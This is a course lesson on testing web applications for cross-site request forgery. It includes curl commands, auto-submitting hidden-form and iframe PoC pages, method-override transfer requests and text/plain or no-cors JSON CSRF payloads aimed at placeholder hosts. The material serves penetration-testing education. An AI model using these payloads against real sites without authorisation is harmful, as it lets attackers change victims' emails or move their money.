# Unit 7: Cross-Site Request Forgery (CSRF) - Topic 5: Testing Methodology

## Overview

Testing for CSRF requires a systematic approach beyond checking for token presence. A thorough assessment evaluates token quality, SameSite configuration, state-changing endpoint coverage, and cross-origin request handling. This topic covers manual testing steps, tool-assisted techniques, token analysis, and testing modern AJAX/JSON APIs for CSRF vulnerabilities.

---

## 1. Manual CSRF Testing Steps

```
CSRF TESTING WORKFLOW
+------------------------------------------------------------+
| Step 1: ENUMERATE state-changing endpoints                 |
|   → Map POST, PUT, PATCH, DELETE endpoints                 |
|   → Identify GET endpoints that modify state               |
+------------------------------------------------------------+
| Step 2: ANALYZE CSRF defenses                              |
|   → Check for tokens in forms/headers                      |
|   → Inspect SameSite cookie attributes                     |
|   → Look for Origin/Referer validation                     |
+------------------------------------------------------------+
| Step 3: TEST token validation                              |
|   → Remove, empty, modify, swap tokens                     |
+------------------------------------------------------------+
| Step 4: CRAFT proof-of-concept                             |
|   → Build HTML PoC, host on separate origin                |
+------------------------------------------------------------+
| Step 5: VALIDATE and document                              |
|   → Confirm state change, assess severity                  |
+------------------------------------------------------------+
```

### Token Validation Test Matrix

| Test Case                  | What to Send                 | Vulnerable If |
|----------------------------|------------------------------|---------------|
| No token parameter         | Omit csrf_token entirely     | 200 Accepted  |
| Empty token                | `csrf_token=`                | 200 Accepted  |
| Invalid token              | `csrf_token=INVALID123`      | 200 Accepted  |
| Another user's token       | Token from different session | 200 Accepted  |
| Reused after logout        | Token from expired session   | 200 Accepted  |
| Swapped method (POST→GET)  | Same params via GET string   | 200 Accepted  |

```bash
# Test without CSRF token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=VALID" -d "email=attacker@evil.com"

# Test with empty token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=VALID" -d "email=attacker@evil.com&csrf_token="

# Test with invalid token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=VALID" -d "email=attacker@evil.com&csrf_token=AAAA"

# Check cookie attributes
curl -v https://target.com/login 2>&1 | grep -i "set-cookie"
```

---

## 2. Burp Suite CSRF PoC Generator

```
1. Intercept state-changing request in Proxy/HTTP History
2. Right-click → Engagement tools → Generate CSRF PoC
3. Burp creates auto-submitting HTML page
4. Click "Test in browser" to validate
5. Modify PoC for report documentation
```

### Manual PoC Template

```html
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF PoC — Email Change</h1>
  <form id="csrf-poc" action="https://target.com/change-email"
        method="POST" style="display:none;">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf-poc').submit();</script>

  <!-- Silent variant using iframe target -->
  <iframe name="csrf-frame" style="display:none;"></iframe>
  <form id="csrf-silent" action="https://target.com/change-email"
        method="POST" target="csrf-frame">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf-silent').submit();</script>
</body>
</html>
```

```bash
# Host PoC locally
python -m http.server 8080    # Python 3
php -S 0.0.0.0:8080           # PHP
npx http-server -p 8080       # Node.js
```

---

## 3. Token Analysis Techniques

```bash
# Collect multiple tokens for analysis
for i in $(seq 1 20); do
    curl -s https://target.com/form | grep -oP 'csrf_token" value="\K[^"]+' >> tokens.txt
done

# Check for duplicates (weak generation)
sort tokens.txt | uniq -c | sort -rn | head

# Check length consistency
awk '{ print length }' tokens.txt | sort -u
```

### Common Token Weaknesses

| Weakness           | Detection Method                                   |
|--------------------|----------------------------------------------------|
| Sequential tokens  | Collect 10+; check for incrementing patterns       |
| Timestamp-based    | Convert values; check correlation with request time|
| Session ID derived | Compare with session cookie (MD5/SHA1 relation)    |
| Short tokens       | < 16 chars suggests weak randomness                |
| Reusable post-logout| Use expired session token; check acceptance       |

**Burp Sequencer:** Send token request to Sequencer → capture 5,000+ tokens → analyze. Expect > 100 bits effective entropy.

---

## 4. Testing State-Changing Operations

```bash
# Find GET endpoints that modify state (anti-pattern)
curl -s https://target.com/api/docs | grep -E "GET.*(delete|remove|update|change)"

# Test method interchange — does POST endpoint accept GET?
curl "https://target.com/api/transfer?to=attacker&amount=100" \
  -H "Cookie: session=VALID"

# Test method override
curl "https://target.com/api/transfer?_method=POST&to=attacker&amount=100" \
  -H "Cookie: session=VALID"

# Test X-HTTP-Method-Override header
curl -X GET "https://target.com/api/transfer?to=attacker&amount=100" \
  -H "Cookie: session=VALID" -H "X-HTTP-Method-Override: POST"
```

---

## 5. CSRF in JSON/AJAX Requests

### Content-Type and CORS Preflight

```
Content-Type                       Cross-origin without preflight?
──────────────────────────────     ─────────────────────────────
application/x-www-form-urlencoded  YES — simple request
multipart/form-data                YES — simple request
text/plain                         YES — simple request
application/json                   NO — triggers preflight
```

### JSON CSRF Techniques

```html
<!-- text/plain with JSON-like body -->
<form action="https://target.com/api/action" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}' />
</form>
<!-- Body: {"email":"attacker@evil.com","x":"="}  -->

<!-- fetch with no-cors mode -->
<script>
fetch('https://target.com/api/action', {
  method: 'POST', mode: 'no-cors',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### API CSRF Checklist

| Check                              | Method                          | Risk If Passes |
|------------------------------------|---------------------------------|----------------|
| Accepts form-encoded instead of JSON| Change Content-Type            | High           |
| Accepts text/plain                 | Change Content-Type             | High           |
| No Content-Type validation         | Omit header entirely            | Medium         |
| CORS reflects attacker origin      | Send `Origin: https://evil.com` | Critical       |
| No custom header required          | Omit X-Requested-With           | Medium         |
| Accepts GET for state change       | Switch POST to GET              | High           |

```bash
# Test Content-Type flexibility
curl -X POST https://target.com/api/action \
  -H "Cookie: session=VALID" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@evil.com"

# Test CORS configuration
curl -H "Origin: https://evil.com" \
  -I https://target.com/api/data 2>&1 | grep -i "access-control"
```

---

## Summary Table

| Concept                   | Key Takeaway                                                 |
|---------------------------|--------------------------------------------------------------|
| **Testing Workflow**      | Enumerate → Analyze → Test tokens → Build PoC → Verify      |
| **Token Validation**      | Remove, empty, modify, swap — all should be rejected         |
| **Burp CSRF PoC**        | Right-click → Engagement tools → Generate CSRF PoC           |
| **Token Entropy**         | Use Burp Sequencer; expect > 100 bits effective entropy      |
| **JSON CSRF**             | Possible via text/plain or form-encoded content type switch  |
| **CORS Misconfig**        | Reflected origins enable full cross-origin attacks            |
| **Method Interchange**    | Always test if POST endpoints accept GET equivalents         |

---

## Revision Questions

1. Describe the five-step CSRF testing methodology. Why is endpoint enumeration the critical first step?
2. An app has `SameSite=Lax` but no CSRF tokens. How would you test and exploit a GET-based state-changing endpoint?
3. A JSON API requires `Content-Type: application/json`. Why is this alone not sufficient CSRF defense?
4. Burp Sequencer shows 40 bits of entropy in CSRF tokens. Assess the practical exploitability.
5. An app's token validation passes all tests but the token never changes within a session. Is this a vulnerability?
6. Describe three techniques for CSRF against JSON APIs. For each, specify Content-Type and whether CORS preflight triggers.

---

*Previous: [04-samesite-cookies.md](04-samesite-cookies.md) | Next: [06-prevention-techniques.md](06-prevention-techniques.md)*

---

*[Back to README](../README.md)*
